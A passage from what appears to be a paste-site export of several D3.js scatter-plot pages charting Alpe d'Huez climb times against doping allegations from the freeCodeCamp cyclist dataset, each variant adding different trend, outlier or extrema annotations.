    <script src=""https://d3js.org/d3.v6.min.js"" charset=""utf-8""></script>
  </head>

  <style>
    * {
      font-family: sans-serif;
    }

    #tooltip {
      visibility: hidden;
      position: absolute;
      opacity: 0.8;
      padding: 10px;
      vertical-align: middle;
      border-radius: 5px;
      background-color: #ecf0f1;
      font-size: 14px;
    }

    .textbox {
      font-size: 14px;
    }

    #legend {
      opacity: 0.2;
      fill: #2c3e50;
    }

    #title {
      text-anchor: middle;
      font-size: 22px;
    }

    .label {
      text-anchor: middle;
    }

    #svg {
      background-color: white;
    }

    .annotation {
      fill: red;
      stroke: red;
    }
  </style>

  <body>
    <div id=""container"" align=""center""></div>

    <script type=""text/javascript"">
      // Url to the input data
      var url =
        ""https://raw.githubusercontent.com/freeCodeCamp/ProjectReferenceData/master/cyclist-data.json"";

      // Colors to differentiate riders with and without doping allegations
      var colors = [""#27ae60"", ""#8e44ad""];

      // The attributes of the riders corresponding to the above colors
      var legendKeys = [""No Doping Allegations"", ""Doping Allegations""];

      // Create an invisible div for the tooltip
      const tooltip = d3
        .select(""body"")
        .append(""div"")
        .attr(""id"", ""tooltip"")
        .style(""visibility"", ""hidden"");

      // 1. Load the data from external source
      d3.json(url).then(function (data) {
        // 2. Append svg-object for the bar chart to a div in your webpage
        // (here we use a div with id=container)
        var width = 700;
        var height = 500;
        var margin = { left: 90, top: 80, bottom: 50, right: 20 };
        var axisOffset = 10; // How for the axes are moved away from each other

        const svg = d3
          .select(""#container"")
          .append(""svg"")
          .attr(""id"", ""svg"")
          .attr(""width"", width)
          .attr(""height"", height);

        // 3. Define scales to translate domains of the data to the range of the svg
        var xMin = d3.min(data, (d) => d[""Year""]);
        var xMax = d3.max(data, (d) => d[""Year""]);

        var parseTime = d3.timeParse(""%M:%S"");
        var yMin = d3.min(data, (d) => parseTime(d[""Time""]));
        var yMax = d3.max(data, (d) => parseTime(d[""Time""]));

        var xScale = d3
          .scaleLinear()
          .domain([xMin, xMax])
          .range([margin.left + axisOffset, width - margin.right]);

        var yScale = d3
          .scaleTime()
          .domain([yMax, yMin])
          .range([height - margin.bottom - axisOffset, margin.top]);

        // 4. Draw and transform/translate horizontal and vertical axes
        var xAxis = d3.axisBottom().scale(xScale).tickFormat(d3.format(""d""));
        var yAxis = d3
          .axisLeft()
          .scale(yScale)
          .tickFormat(d3.timeFormat(""%M:%S""));

        svg
          .append(""g"")
          .attr(""transform"", ""translate(0, "" + (height - margin.bottom) + "")"")
          .attr(""id"", ""x-axis"")
          .call(xAxis);

        svg
          .append(""g"")
          .attr(""transform"", ""translate("" + margin.left + "", 0)"")
          .attr(""id"", ""y-axis"")
          .call(yAxis);

        // 5. Draw individual scatter points and define mouse events for the tooltip
        svg
          .selectAll(""scatterPoints"")
          .data(data)
          .enter()
          .append(""circle"")
          .attr(""cx"", (d) => xScale(d[""Year""]))
          .attr(""cy"", (d) => yScale(parseTime(d[""Time""])))
          .attr(""r"", 5)
          .attr(""fill"", (d) => (d[""Doping""] == """" ? colors[0] : colors[1]))
          .attr(""class"", ""dot"")
          .attr(""data-xvalue"", (d) => d[""Year""])
          .attr(""data-yvalue"", (d) => parseTime(d[""Time""]))
          .on(""mouseover"", function (d) {
            info = d[""originalTarget""][""__data__""];
            tooltip
              .style(""visibility"", ""visible"")
              .style(""left"", event.pageX + 10 + ""px"")
              .style(""top"", event.pageY - 80 + ""px"")
              .attr(""data-year"", info[""Year""])
              .html(
                info[""Name""] +
                  "" ("" +
                  info[""Year""] +
                  "") <br> Time: "" +
                  info[""Time""] +
                  ""<br><br>"" +
                  info[""Doping""]
              );
          })
          .on(""mousemove"", function () {
            tooltip.style(""left"", event.pageX + 10 + ""px"");
          })
          .on(""mouseout"", function () {
            tooltip.style(""visibility"", ""hidden"");
          });

        // 6. Finalize chart by adding title, axes labels and legend
        svg
          .append(""text"")
          .attr(""x"", margin.left + (width - margin.left - margin.right) / 2)
          .attr(""y"", height - margin.bottom / 5)
          .attr(""class"", ""label"")
          .text(""Year"");

        svg
          .append(""text"")
          .attr(""y"", margin.left / 4)
          .attr(""x"", -height / 2)
          .attr(""transform"", ""rotate(-90)"")
          .attr(""class"", ""label"")
          .text(""Time to finish"");

        svg
          .append(""text"")
          .attr(""x"", margin.left + (width - margin.left - margin.right) / 2)
          .attr(""y"", margin.top / 2.6)
          .attr(""id"", ""title"")
          .text(""Doping in professional bike racing"");

        svg
          .append(""text"")
          .attr(""x"", margin.left + (width - margin.left - margin.right) / 2)
          .attr(""y"", margin.top / 1.4)
          .text(""35 fastest times to finish Alpe d'Huez"")
          .style(""font-size"", ""16px"")
          .style(""text-anchor"", ""middle"");

        svg
          .selectAll(""legendSymbols"")
          .data(legendKeys)
          .enter()
          .append(""circle"")
          .attr(""cx"", width - margin.right - 200)
          .attr(""cy"", (d, i) => 150 + i * 25)
          .attr(""r"", 5)
          .attr(""fill"", (d, i) => colors[i]);

        svg
          .selectAll(""legendTexts"")
          .data(legendKeys)
          .enter()
          .append(""text"")
          .text((d) => d)
          .attr(""x"", width - margin.right - 200 + 15)
          .attr(""y"", (d, i) => 150 + i * 25 + 5)
          .attr(""class"", ""textbox"");

        const legend = svg
          .append(""rect"")
          .attr(""x"", width - margin.right - 200 - 15)
          .attr(""y"", 150 - 5 - 10)
          .attr(""rx"", 5)
          .attr(""ry"", 5)
          .attr(""width"", 195)
          .attr(""height"", 55)
          .attr(""id"", ""legend"");

        // Annotations
        svg
          .append(""line"")
          .attr(""x1"", xScale(1995))
          .attr(""y1"", yScale(parseTime(""36:50"")))
          .attr(""x2"", xScale(2015))
          .attr(""y2"", yScale(parseTime(""39:23"")))
          .attr(""stroke-width"", 2)
          .attr(""stroke"", ""red"");

        svg
          .append(""text"")
          .attr(""x"", xScale(2005))
          .attr(""y"", yScale(parseTime(""38:00"")))
          .attr(""class"", ""annotation"")
          .text(""Time range from fastest to slowest"");
      });
    </script>
  </body>
</html>
"
d5pxMzJp,exception_scatter,NTahmid,HTML,Tuesday 13th of February 2024 11:11:50 AM CDT,"<!doctype html>
<meta charset=""utf-8"" />
<html>
  <head>
    <script src=""https://d3js.org/d3.v6.min.js"" charset=""utf-8""></script>
  </head>

  <style>
    * {
      font-family: sans-serif;
    }

    #tooltip {
      visibility: hidden;
      position: absolute;
      opacity: 0.8;
      padding: 10px;
      vertical-align: middle;
      border-radius: 5px;
      background-color: #ecf0f1;
      font-size: 14px;
    }

    .textbox {
      font-size: 14px;
    }

    #legend {
      opacity: 0.2;
      fill: #2c3e50;
    }

    #title {
      text-anchor: middle;
      font-size: 22px;
    }

    .label {
      text-anchor: middle;
    }

    #svg {
      background-color: white;
    }

    .annotation {
      fill: red;
      stroke: red;
    }
  </style>

  <body>
    <div id=""container"" align=""center""></div>

    <script type=""text/javascript"">
      var url =
        ""https://raw.githubusercontent.com/freeCodeCamp/ProjectReferenceData/master/cyclist-data.json"";

      var colors = [""#27ae60"", ""#8e44ad""];
      var legendKeys = [""No Doping Allegations"", ""Doping Allegations""];

      const tooltip = d3
        .select(""body"")
        .append(""div"")
        .attr(""id"", ""tooltip"")
        .style(""visibility"", ""hidden"");

      d3.json(url).then(function (data) {
        var width = 700;
        var height = 500;
        var margin = { left: 90, top: 80, bottom: 50, right: 20 };
        var axisOffset = 10;

        const svg = d3
          .select(""#container"")
          .append(""svg"")
          .attr(""id"", ""svg"")
          .attr(""width"", width)
          .attr(""height"", height);

        var xMin = d3.min(data, (d) => d[""Year""]);
        var xMax = d3.max(data, (d) => d[""Year""]);

        var parseTime = d3.timeParse(""%M:%S"");
        var yMin = d3.min(data, (d) => parseTime(d[""Time""]));
        var yMax = d3.max(data, (d) => parseTime(d[""Time""]));

        var xScale = d3
          .scaleLinear()
          .domain([xMin, xMax])
          .range([margin.left + axisOffset, width - margin.right]);

        var yScale = d3
          .scaleTime()
          .domain([yMax, yMin])
          .range([height - margin.bottom - axisOffset, margin.top]);

        var xAxis = d3.axisBottom().scale(xScale).tickFormat(d3.format(""d""));
        var yAxis = d3
          .axisLeft()
          .scale(yScale)
          .tickFormat(d3.timeFormat(""%M:%S""));

        svg
          .append(""g"")
          .attr(""transform"", ""translate(0, "" + (height - margin.bottom) + "")"")
          .attr(""id"", ""x-axis"")
          .call(xAxis);

        svg
          .append(""g"")
          .attr(""transform"", ""translate("" + margin.left + "", 0)"")
          .attr(""id"", ""y-axis"")
          .call(yAxis);

        svg
          .selectAll(""scatterPoints"")
          .data(data)
          .enter()
          .append(""circle"")
          .attr(""cx"", (d) => xScale(d[""Year""]))
          .attr(""cy"", (d) => yScale(parseTime(d[""Time""])))
          .attr(""r"", 5)
          .attr(""fill"", (d) => (d[""Doping""] == """" ? colors[0] : colors[1]))
          .attr(""class"", ""dot"")
          .attr(""data-xvalue"", (d) => d[""Year""])
          .attr(""data-yvalue"", (d) => parseTime(d[""Time""]))
          .on(""mouseover"", function (d) {
            info = d[""originalTarget""][""__data__""];
            tooltip
              .style(""visibility"", ""visible"")
              .style(""left"", event.pageX + 10 + ""px"")
              .style(""top"", event.pageY - 80 + ""px"")
              .attr(""data-year"", info[""Year""])
              .html(
                info[""Name""] +
                  "" ("" +
                  info[""Year""] +
                  "") <br> Time: "" +
                  info[""Time""] +
                  ""<br><br>"" +
                  info[""Doping""]
              );
          })
          .on(""mousemove"", function () {
            tooltip.style(""left"", event.pageX + 10 + ""px"");
          })
          .on(""mouseout"", function () {
            tooltip.style(""visibility"", ""hidden"");
          });

        svg
          .append(""text"")
          .attr(""x"", margin.left + (width - margin.left - margin.right) / 2)
          .attr(""y"", height - margin.bottom / 5)
          .attr(""class"", ""label"")
          .text(""Year"");

        svg
          .append(""text"")
          .attr(""y"", margin.left / 4)
          .attr(""x"", -height / 2)
          .attr(""transform"", ""rotate(-90)"")
          .attr(""class"", ""label"")
          .text(""Time to finish"");

        svg
          .append(""text"")
          .attr(""x"", margin.left + (width - margin.left - margin.right) / 2)
          .attr(""y"", margin.top / 2.6)
          .attr(""id"", ""title"")
          .text(""Doping in professional bike racing"");

        svg
          .append(""text"")
          .attr(""x"", margin.left + (width - margin.left - margin.right) / 2)
          .attr(""y"", margin.top / 1.4)
          .text(""35 fastest times to finish Alpe d'Huez"")
          .style(""font-size"", ""16px"")
          .style(""text-anchor"", ""middle"");

        svg
          .selectAll(""legendSymbols"")
          .data(legendKeys)
          .enter()
          .append(""circle"")
          .attr(""cx"", width - margin.right - 200)
          .attr(""cy"", (d, i) => 150 + i * 25)
          .attr(""r"", 5)
          .attr(""fill"", (d, i) => colors[i]);

        svg
          .selectAll(""legendTexts"")
          .data(legendKeys)
          .enter()
          .append(""text"")
          .text((d) => d)
          .attr(""x"", width - margin.right - 200 + 15)
          .attr(""y"", (d, i) => 150 + i * 25 + 5)
          .attr(""class"", ""textbox"");

        const legend = svg
          .append(""rect"")
          .attr(""x"", width - margin.right - 200 - 15)
          .attr(""y"", 150 - 5 - 10)
          .attr(""rx"", 5)
          .attr(""ry"", 5)
          .attr(""width"", 195)
          .attr(""height"", 55)
          .attr(""id"", ""legend"");

        // Annotation
        svg
          .selectAll(""annotation"")
          .data(data.filter((d) => d[""Doping""] !== """"))
          .enter()
          .append(""line"")
          .attr(""x1"", (d) => xScale(d[""Year""]))
          .attr(""y1"", (d) => yScale(parseTime(d[""Time""])))
          .attr(""x2"", (d) => xScale(d[""Year""]) + 20)
          .attr(""y2"", (d) => yScale(parseTime(d[""Time""])) - 20)
          .attr(""stroke-width"", 1)
          .attr(""stroke"", ""red"");

        svg
          .selectAll(""annotation"")
          .data(data.filter((d) => d[""Doping""] !== """"))
          .enter()
          .append(""text"")
          .attr(""x"", (d) => xScale(d[""Year""]) + 25)
          .attr(""y"", (d) => yScale(parseTime(d[""Time""])) - 25)
          .text((d) => d[""Name""])
          .attr(""class"", ""annotation"");
      });
    </script>
  </body>
</html>
"
kQYzhgUP,outliers_scatter,NTahmid,HTML,Tuesday 13th of February 2024 11:07:09 AM CDT,"<!doctype html>
<meta charset=""utf-8"" />
<html>
  <head>
    <script src=""https://d3js.org/d3.v6.min.js"" charset=""utf-8""></script>
  </head>

  <style>
    * {
      font-family: sans-serif;
    }

    #tooltip {
      visibility: hidden;
      position: absolute;
      opacity: 0.8;
      padding: 10px;
      vertical-align: middle;
      border-radius: 5px;
      background-color: #ecf0f1;
      font-size: 14px;
    }

    .textbox {
      font-size: 14px;
    }

    #legend {
      opacity: 0.2;
      fill: #2c3e50;
    }

    #title {
      text-anchor: middle;
      font-size: 22px;
    }

    .label {
      text-anchor: middle;
    }

    #svg {
      background-color: white;
    }

    .outlier {
      stroke: red;
      stroke-width: 2;
    }
  </style>

  <body>
    <div id=""container"" align=""center""></div>

    <script type=""text/javascript"">
      var url =
        ""https://raw.githubusercontent.com/freeCodeCamp/ProjectReferenceData/master/cyclist-data.json"";

      var colors = [""#27ae60"", ""#8e44ad""];
      var legendKeys = [""No Doping Allegations"", ""Doping Allegations""];

      const tooltip = d3
        .select(""body"")
        .append(""div"")
        .attr(""id"", ""tooltip"")
        .style(""visibility"", ""hidden"");

      d3.json(url).then(function (data) {
        var width = 700;
        var height = 500;
        var margin = { left: 90, top: 80, bottom: 50, right: 20 };
        var axisOffset = 10;

        const svg = d3
          .select(""#container"")
          .append(""svg"")
          .attr(""id"", ""svg"")
          .attr(""width"", width)
          .attr(""height"", height);

        var xMin = d3.min(data, (d) => d[""Year""]);
        var xMax = d3.max(data, (d) => d[""Year""]);

        var parseTime = d3.timeParse(""%M:%S"");
        var yMin = d3.min(data, (d) => parseTime(d[""Time""]));
        var yMax = d3.max(data, (d) => parseTime(d[""Time""]));

        var xScale = d3
          .scaleLinear()
          .domain([xMin, xMax])
          .range([margin.left + axisOffset, width - margin.right]);

        var yScale = d3
          .scaleTime()
          .domain([yMax, yMin])
          .range([height - margin.bottom - axisOffset, margin.top]);

        var xAxis = d3.axisBottom().scale(xScale).tickFormat(d3.format(""d""));
        var yAxis = d3
          .axisLeft()
          .scale(yScale)
          .tickFormat(d3.timeFormat(""%M:%S""));

        svg
          .append(""g"")
          .attr(""transform"", ""translate(0, "" + (height - margin.bottom) + "")"")
          .attr(""id"", ""x-axis"")
          .call(xAxis);

        svg
          .append(""g"")
          .attr(""transform"", ""translate("" + margin.left + "", 0)"")
          .attr(""id"", ""y-axis"")
          .call(yAxis);

        svg
          .selectAll(""scatterPoints"")
          .data(data)
          .enter()
          .append(""circle"")
          .attr(""cx"", (d) => xScale(d[""Year""]))
          .attr(""cy"", (d) => yScale(parseTime(d[""Time""])))
          .attr(""r"", 5)
          .attr(""fill"", (d) => (d[""Doping""] == """" ? colors[0] : colors[1]))
          .attr(""class"", (d) => (d[""Place""] > 30 ? ""dot outlier"" : ""dot""))
          .attr(""data-xvalue"", (d) => d[""Year""])
          .attr(""data-yvalue"", (d) => parseTime(d[""Time""]))
          .on(""mouseover"", function (d) {
            info = d[""originalTarget""][""__data__""];
            tooltip
              .style(""visibility"", ""visible"")
              .style(""left"", event.pageX + 10 + ""px"")
              .style(""top"", event.pageY - 80 + ""px"")
              .attr(""data-year"", info[""Year""])
              .html(
                info[""Name""] +
                  "" ("" +
                  info[""Year""] +
                  "") <br> Time: "" +
                  info[""Time""] +
                  ""<br><br>"" +
                  info[""Doping""]
              );
          })
          .on(""mousemove"", function () {
            tooltip.style(""left"", event.pageX + 10 + ""px"");
          })
          .on(""mouseout"", function () {
            tooltip.style(""visibility"", ""hidden"");
          });

        svg
          .append(""text"")
          .attr(""x"", margin.left + (width - margin.left - margin.right) / 2)
          .attr(""y"", height - margin.bottom / 5)
          .attr(""class"", ""label"")
          .text(""Year"");

        svg
          .append(""text"")
          .attr(""y"", margin.left / 4)
          .attr(""x"", -height / 2)
          .attr(""transform"", ""rotate(-90)"")
          .attr(""class"", ""label"")
          .text(""Time to finish"");

        svg
          .append(""text"")
          .attr(""x"", margin.left + (width - margin.left - margin.right) / 2)
          .attr(""y"", margin.top / 2.6)
          .attr(""id"", ""title"")
          .text(""Doping in professional bike racing"");

        svg
          .append(""text"")
          .attr(""x"", margin.left + (width - margin.left - margin.right) / 2)
          .attr(""y"", margin.top / 1.4)
          .text(""35 fastest times to finish Alpe d'Huez"")
          .style(""font-size"", ""16px"")
          .style(""text-anchor"", ""middle"");

        svg
          .selectAll(""legendSymbols"")
          .data(legendKeys)
          .enter()
          .append(""circle"")
          .attr(""cx"", width - margin.right - 200)
          .attr(""cy"", (d, i) => 150 + i * 25)
          .attr(""r"", 5)
          .attr(""fill"", (d, i) => colors[i]);

        svg
          .selectAll(""legendTexts"")
          .data(legendKeys)
          .enter()
          .append(""text"")
          .text((d) => d)
          .attr(""x"", width - margin.right - 200 + 15)
          .attr(""y"", (d, i) => 150 + i * 25 + 5)
          .attr(""class"", ""textbox"");

        const legend = svg
          .append(""rect"")
          .attr(""x"", width - margin.right - 200 - 15)
          .attr(""y"", 150 - 5 - 10)
          .attr(""rx"", 5)
          .attr(""ry"", 5)
          .attr(""width"", 195)
          .attr(""height"", 55)
          .attr(""id"", ""legend"");
      });
    </script>
  </body>
</html>
"
DZr08J7n,extrema_scatter,NTahmid,HTML 5,Tuesday 13th of February 2024 11:06:01 AM CDT,"<!doctype html>
<meta charset=""utf-8"" />
<html>
  <head>
    <script src=""https://d3js.org/d3.v6.min.js"" charset=""utf-8""></script>
  </head>

  <style>
    * {
      font-family: sans-serif;
    }

    #tooltip {
      visibility: hidden;
      position: absolute;
      opacity: 0.8;
      padding: 10px;
      vertical-align: middle;
      border-radius: 5px;
      background-color: #ecf0f1;
      font-size: 14px;
    }

    .textbox {
      font-size: 14px;
    }

    #legend {
      opacity: 0.2;
      fill: #2c3e50;
    }

    #title {
      text-anchor: middle;
      font-size: 22px;
    }

    .label {
      text-anchor: middle;
    }

    #svg {
      background-color: white;
    }

    .annotation-line {
      stroke: red;
      stroke-width: 1.5;
    }

    .annotation-text {
      fill: red;
      font-size: 12px;
    }
  </style>

  <body>
    <div id=""container"" align=""center""></div>

    <script type=""text/javascript"">
      var url =
        ""https://raw.githubusercontent.com/freeCodeCamp/ProjectReferenceData/master/cyclist-data.json"";

      var colors = [""#27ae60"", ""#8e44ad""];
      var legendKeys = [""No Doping Allegations"", ""Doping Allegations""];

      const tooltip = d3
        .select(""body"")
        .append(""div"")
        .attr(""id"", ""tooltip"")
        .style(""visibility"", ""hidden"");

      d3.json(url).then(function (data) {
        var width = 700;
        var height = 500;
        var margin = { left: 90, top: 80, bottom: 50, right: 20 };
        var axisOffset = 10;

        const svg = d3
          .select(""#container"")
          .append(""svg"")
          .attr(""id"", ""svg"")
          .attr(""width"", width)
          .attr(""height"", height);

        var xMin = d3.min(data, (d) => d[""Year""]);
        var xMax = d3.max(data, (d) => d[""Year""]);

        var parseTime = d3.timeParse(""%M:%S"");
        var yMin = d3.min(data, (d) => parseTime(d[""Time""]));
        var yMax = d3.max(data, (d) => parseTime(d[""Time""]));

        var xScale = d3
          .scaleLinear()
          .domain([xMin, xMax])
          .range([margin.left + axisOffset, width - margin.right]);

        var yScale = d3
          .scaleTime()
          .domain([yMax, yMin])
          .range([height - margin.bottom - axisOffset, margin.top]);

        var xAxis = d3.axisBottom().scale(xScale).tickFormat(d3.format(""d""));
        var yAxis = d3
          .axisLeft()
          .scale(yScale)
          .tickFormat(d3.timeFormat(""%M:%S""));

        svg
          .append(""g"")
          .attr(""transform"", ""translate(0, "" + (height - margin.bottom) + "")"")
          .attr(""id"", ""x-axis"")
          .call(xAxis);

        svg
          .append(""g"")
          .attr(""transform"", ""translate("" + margin.left + "", 0)"")
          .attr(""id"", ""y-axis"")
          .call(yAxis);

        svg
          .selectAll(""scatterPoints"")
          .data(data)
          .enter()
          .append(""circle"")
          .attr(""cx"", (d) => xScale(d[""Year""]))
          .attr(""cy"", (d) => yScale(parseTime(d[""Time""])))
          .attr(""r"", 5)
          .attr(""fill"", (d) => (d[""Doping""] == """" ? colors[0] : colors[1]))
          .attr(""class"", ""dot"")
          .attr(""data-xvalue"", (d) => d[""Year""])
          .attr(""data-yvalue"", (d) => parseTime(d[""Time""]))
          .on(""mouseover"", function (d) {
            info = d[""originalTarget""][""__data__""];
            tooltip
              .style(""visibility"", ""visible"")
              .style(""left"", event.pageX + 10 + ""px"")
              .style(""top"", event.pageY - 80 + ""px"")
              .attr(""data-year"", info[""Year""])
              .html(
                info[""Name""] +
                  "" ("" +
                  info[""Year""] +
                  "") <br> Time: "" +
                  info[""Time""] +
                  ""<br><br>"" +
                  info[""Doping""]
              );
          })
          .on(""mousemove"", function () {
            tooltip.style(""left"", event.pageX + 10 + ""px"");
          })
          .on(""mouseout"", function () {
            tooltip.style(""visibility"", ""hidden"");
          });

        svg
          .append(""text"")
          .attr(""x"", margin.left + (width - margin.left - margin.right) / 2)
          .attr(""y"", height - margin.bottom / 5)
          .attr(""class"", ""label"")
          .text(""Year"");

        svg
          .append(""text"")
          .attr(""y"", margin.left / 4)
          .attr(""x"", -height / 2)
          .attr(""transform"", ""rotate(-90)"")
          .attr(""class"", ""label"")
          .text(""Time to finish"");

        svg
          .append(""text"")
          .attr(""x"", margin.left + (width - margin.left - margin.right) / 2)
          .attr(""y"", margin.top / 2.6)
          .attr(""id"", ""title"")
          .text(""Doping in professional bike racing"");

        svg
          .append(""text"")
          .attr(""x"", margin.left + (width - margin.left - margin.right) / 2)
          .attr(""y"", margin.top / 1.4)
          .text(""35 fastest times to finish Alpe d'Huez"")
          .style(""font-size"", ""16px"")
          .style(""text-anchor"", ""middle"");

        svg
          .selectAll(""legendSymbols"")
          .data(legendKeys)
          .enter()
          .append(""circle"")
          .attr(""cx"", width - margin.right - 200)
          .attr(""cy"", (d, i) => 150 + i * 25)
          .attr(""r"", 5)
          .attr(""fill"", (d, i) => colors[i]);

        svg
          .selectAll(""legendTexts"")
          .data(legendKeys)
          .enter()
          .append(""text"")
          .text((d) => d)
          .attr(""x"", width - margin.right - 200 + 15)
          .attr(""y"", (d, i) => 150 + i * 25 + 5)
          .attr(""class"", ""textbox"");

        const legend = svg
          .append(""rect"")
          .attr(""x"", width - margin.right - 200 - 15)
          .attr(""y"", 150 - 5 - 10)
          .attr(""rx"", 5)
          .attr(""ry"", 5)
          .attr(""width"", 195)
          .attr(""height"", 55)
          .attr(""id"", ""legend"");

        // Annotations for extrema
        var minTime = d3.min(data, (d) => d[""Seconds""]);
        var maxTime = d3.max(data, (d) => d[""Seconds""]);
        var minData = data.find((d) => d[""Seconds""] === minTime);
        var maxData = data.find((d) => d[""Seconds""] === maxTime);

        // Annotation for minimum time
        svg.append(""line"")
          .attr(""x1"", xScale(minData[""Year""]))
          .attr(""y1"", yScale(parseTime(minData[""Time""])))
          .attr(""x2"", xScale(minData[""Year""]) - 50)
          .attr(""y2"", yScale(parseTime(minData[""Time""])) - 50)
          .attr(""class"", ""annotation-line"");

        svg.append(""text"")
          .attr(""x"", xScale(minData[""Year""]) - 55)
          .attr(""y"", yScale(parseTime(minData[""Time""])) - 55)
          .text(""Fastest time: "" + minData[""Time""])
          .attr(""class"", ""annotation-text"");

        // Annotation for maximum time
        svg.append(""line"")
          .attr(""x1"", xScale(maxData[""Year""]))
          .attr(""y1"", yScale(parseTime(maxData[""Time""])))
          .attr(""x2"", xScale(maxData[""Year""]) - 80 )
          .attr(""y2"", yScale(parseTime(maxData[""Time""])) + 40)
          .attr(""class"", ""annotation-line"");

        svg.append(""text"")
          .attr(""x"", xScale(maxData[""Year""]) - 100)
          .attr(""y"", yScale(parseTime(maxData[""Time""])) + 55)
          .text(""Slowest time: "" + maxData[""Time""])
          .attr(""class"", ""annotation-text"");
      });
    </script>
  </body>
</html>
"
J2Hw6Kfu,complex_trend_scatter,NTahmid,HTML 5,Tuesday 13th of February 2024 11:04:13 AM CDT,"```<!doctype html>
<meta charset=""utf-8"" />
<html>
  <head>
    <script src=""https://d3js.org/d3.v6.min.js"" charset=""utf-8""></script>
  </head>

  <style>
    * {
      font-family: sans-serif;
    }

    #tooltip {
      visibility: hidden;
      position: absolute;
      opacity: 0.8;
      padding: 10px;
      vertical-align: middle;
      border-radius: 5px;
      background-color: #ecf0f1;
      font-size: 14px;
    }

    .textbox {
      font-size: 14px;
    }

    #legend {
      opacity: 0.2;
      fill: #2c3e50;
    }

    #title {
      text-anchor: middle;
      font-size: 22px;
    }

    .label {
      text-anchor: middle;
    }

    #svg {
      background-color: white;
    }

    .annotation {
      fill: red;
      stroke: red;
    }
  </style>

  <body>
    <div id=""container"" align=""center""></div>

    <script type=""text/javascript"">
      // Url to the input data
      var url =
        ""https://raw.githubusercontent.com/freeCodeCamp/ProjectReferenceData/master/cyclist-data.json"";

      // Colors to differentiate riders with and without doping allegations
      var colors = [""#27ae60"", ""#8e44ad""];

      // The attributes of the riders corresponding to the above colors
      var legendKeys = [""No Doping Allegations"", ""Doping Allegations""];

      // Create an invisible div for the tooltip
      const tooltip = d3
        .select(""body"")
        .append(""div"")
        .attr(""id"", ""tooltip"")
        .style(""visibility"", ""hidden"");

      // 1. Load the data from external source
      d3.json(url).then(function (data) {
        // 2. Append svg-object for the bar chart to a div in your webpage
        // (here we use a div with id=container)
        var width = 700;
        var height = 500;
        var margin = { left: 90, top: 80, bottom: 50, right: 20 };
        var axisOffset = 10; // How for the axes are moved away from each other

        const svg = d3
          .select(""#container"")
          .append(""svg"")
          .attr(""id"", ""svg"")
          .attr(""width"", width)
          .attr(""height"", height);

        // 3. Define scales to translate domains of the data to the range of the svg
        var xMin = d3.min(data, (d) => d[""Year""]);
        var xMax = d3.max(data, (d) => d[""Year""]);

        var parseTime = d3.timeParse(""%M:%S"");
        var yMin = d3.min(data, (d) => parseTime(d[""Time""]));
        var yMax = d3.max(data, (d) => parseTime(d[""Time""]));

        var xScale = d3
          .scaleLinear()
          .domain([xMin, xMax])
          .range([margin.left + axisOffset, width - margin.right]);

        var yScale = d3
          .scaleTime()
          .domain([yMax, yMin])
          .range([height - margin.bottom - axisOffset, margin.top]);

        // 4. Draw and transform/translate horizontal and vertical axes
        var xAxis = d3.axisBottom().scale(xScale).tickFormat(d3.format(""d""));
        var yAxis = d3
          .axisLeft()
          .scale(yScale)
          .tickFormat(d3.timeFormat(""%M:%S""));

        svg
          .append(""g"")
          .attr(""transform"", ""translate(0, "" + (height - margin.bottom) + "")"")
          .attr(""id"", ""x-axis"")
          .call(xAxis);

        svg
          .append(""g"")
          .attr(""transform"", ""translate("" + margin.left + "", 0)"")
          .attr(""id"", ""y-axis"")
          .call(yAxis);

        // 5. Draw individual scatter points and define mouse events for the tooltip
        svg
          .selectAll(""scatterPoints"")
          .data(data)
          .enter()
          .append(""circle"")
          .attr(""cx"", (d) => xScale(d[""Year""]))
          .attr(""cy"", (d) => yScale(parseTime(d[""Time""])))
          .attr(""r"", 5)
          .attr(""fill"", (d) => (d[""Doping""] == """" ? colors[0] : colors[1]))
          .attr(""class"", ""dot"")
          .attr(""data-xvalue"", (d) => d[""Year""])
          .attr(""data-yvalue"", (d) => parseTime(d[""Time""]))
          .on(""mouseover"", function (d) {
            info = d[""originalTarget""][""__data__""];
            tooltip
              .style(""visibility"", ""visible"")
              .style(""left"", event.pageX + 10 + ""px"")
              .style(""top"", event.pageY - 80 + ""px"")
              .attr(""data-year"", info[""Year""])
              .html(
                info[""Name""] +
                  "" ("" +
                  info[""Year""] +
                  "") <br> Time: "" +
                  info[""Time""] +
                  ""<br><br>"" +
                  info[""Doping""]
              );
          })
          .on(""mousemove"", function () {
            tooltip.style(""left"", event.pageX + 10 + ""px"");
          })
          .on(""mouseout"", function () {
            tooltip.style(""visibility"", ""hidden"");
          });

        // 6. Finalize chart by adding title, axes labels and legend
        svg
          .append(""text"")
          .attr(""x"", margin.left + (width - margin.left - margin.right) / 2)
          .attr(""y"", height - margin.bottom / 5)
          .attr(""class"", ""label"")
          .text(""Year"");

        svg
          .append(""text"")
          .attr(""y"", margin.left / 4)
          .attr(""x"", -height / 2)
          .attr(""transform"", ""rotate(-90)"")
          .attr(""class"", ""label"")
          .text(""Time to finish"");

        svg
          .append(""text"")
          .attr(""x"", margin.left + (width - margin.left - margin.right) / 2)
          .attr(""y"", margin.top / 2.6)
          .attr(""id"", ""title"")
          .text(""Doping in professional bike racing"");

        svg
          .append(""text"")
          .attr(""x"", margin.left + (width - margin.left - margin.right) / 2)
          .attr(""y"", margin.top / 1.4)
          .text(""35 fastest times to finish Alpe d'Huez"")
          .style(""font-size"", ""16px"")
          .style(""text-anchor"", ""middle"");

        svg
          .selectAll(""legendSymbols"")
          .data(legendKeys)
          .enter()
          .append(""circle"")
          .attr(""cx"", width - margin.right - 200)
          .attr(""cy"", (d, i) => 150 + i * 25)
          .attr(""r"", 5)
          .attr(""fill"", (d, i) => colors[i]);

        svg
          .selectAll(""legendTexts"")
          .data(legendKeys)
          .enter()
          .append(""text"")
          .text((d) => d)
          .attr(""x"", width - margin.right - 200 + 15)
          .attr(""y"", (d, i) => 150 + i * 25 + 5)
          .attr(""class"", ""textbox"");

        const legend = svg
          .append(""rect"")
          .attr(""x"", width - margin.right - 200 - 15)
          .attr(""y"", 150 - 5 - 10)
          .attr(""rx"", 5)
          .attr(""ry"", 5)
          .attr(""width"", 195)
          .attr(""height"", 55)
          .attr(""id"", ""legend"");

        // 7. Add annotations to highlight complex trends
        svg
          .append(""line"")
          .attr(""x1"", xScale(xMin))
          .attr(""y1"", yScale(yMax))
          .attr(""x2"", xScale(xMax))
          .attr(""y2"", yScale(yMin))
          .attr(""stroke-width"", 2)
          .attr(""stroke"", ""red"")
          .attr(""class"", ""annotation"");

        svg
          .append(""text"")
          .attr(""x"", xScale(xMax) - 400)
          .attr(""y"", yScale(yMin) + 30)
          .text(""Trend: Performance improvement over years"")
          .attr(""class"", ""annotation"");

        svg
          .append(""circle"")
